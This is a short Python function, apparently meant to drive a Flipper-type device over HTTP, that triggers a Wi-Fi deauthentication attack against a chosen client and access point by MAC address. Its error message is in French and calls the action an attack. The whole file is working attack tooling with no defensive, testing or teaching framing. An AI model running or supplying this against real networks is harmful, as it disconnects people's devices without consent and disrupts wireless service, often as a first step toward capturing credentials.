import requests

def trigger_deauth(target_mac, ap_mac, flipper_ip="192.168.4.1"):
    url = f"http://{flipper_ip}/deauth?ap={ap_mac}&client={target_mac}"
    try:
        response = requests.get(url)
        return response.text
    except Exception as e:
        return f"Erreur lors de l'attaque : {e}"
